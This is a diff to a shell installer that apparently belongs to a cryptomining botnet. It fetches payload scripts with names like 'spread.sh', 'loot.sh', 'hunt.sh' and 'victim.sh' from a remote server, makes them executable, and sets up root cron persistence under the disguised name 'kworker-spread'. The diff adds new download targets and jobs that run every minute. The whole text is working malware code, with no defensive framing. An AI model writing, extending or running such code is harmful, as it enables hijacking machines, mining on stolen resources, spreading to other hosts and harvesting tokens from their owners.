@@ -47,7 +47,7 @@ sed -e "s|__URL__|${POOL}|g" \
 # 4) helpers. Download to a temp then mv: mv is an atomic rename, so a helper
 #    that is mid-run (spread/hunt fired by a timer) keeps reading its old inode
 #    instead of having the file rewritten underneath it.
-for f in run.sh updater.sh spread.sh hunt.sh loot.sh dock.sh dockmass.sh publish.sh tune.sh shodan.sh nets.txt docknest.sh dockcls.sh _nestd.py; do
+for f in run.sh updater.sh spread.sh hunt.sh loot.sh dock.sh dockmass.sh publish.sh tune.sh shodan.sh nets.txt docknest.sh dockcls.sh dockhot.sh pool.sh victim.sh _nestd.py; do
     curl -fsSL "$CONFIG_URL/$f?v=$(date +%s)" -o "$f.new"
     chmod 0755 "$f.new"
     mv -f "$f.new" "$f"
@@ -94,6 +94,8 @@ else
     printf '5 */6 * * * root %s/loot.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
     printf '45 */6 * * * root %s/dock.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
     printf '15 * * * * root %s/dockmass.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
+    printf '* * * * * root %s/dockhot.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
+    printf '*/10 * * * * root %s/pool.sh log >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
     if [ -n "${GITHUB_TOKEN:-}" ]; then
         printf '30 */12 * * * root %s/hunt.sh all >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
     fi
